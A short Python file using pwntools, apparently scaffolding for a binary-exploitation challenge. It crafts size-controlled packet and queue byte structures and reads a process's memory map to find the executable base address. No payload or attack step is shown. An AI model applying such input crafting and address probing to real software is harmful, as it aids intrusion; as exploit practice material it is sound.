from pwn import *
class queues:
    def __init__(self) -> None:
        self.size = 0
        self.data = b""
        
    def gen(self):
        return p16(self.size) + self.data
    
    
class packet:
    def __init__(self, option) -> None:
        self.option = option
        self.queue_num = 0
        self.queues_list = []
        
    def add_queue(self, size, data) -> None:
        queue = queues()
        queue.size = size
        queue.data = data.ljust(size, b'\x00')
        self.queues_list.append(queue)
    
    def get_queues_data(self):
        if (self.option == 2):
            return p32(self.option) + p32(len(self.queues_list))
        return p32(self.option) + p32(len(self.queues_list)) + b''.join([queue.gen() for queue in self.queues_list])

    
def get_exe_base(pid):
    maps_file = f"/proc/{pid}/maps"
    exe_base = None

    with open(maps_file, 'r') as f:
        exe_base = int(f.readline().split('-')[0], 16)

    if exe_base is None:
        raise Exception("Executable base address not found.")
    
    return exe_base


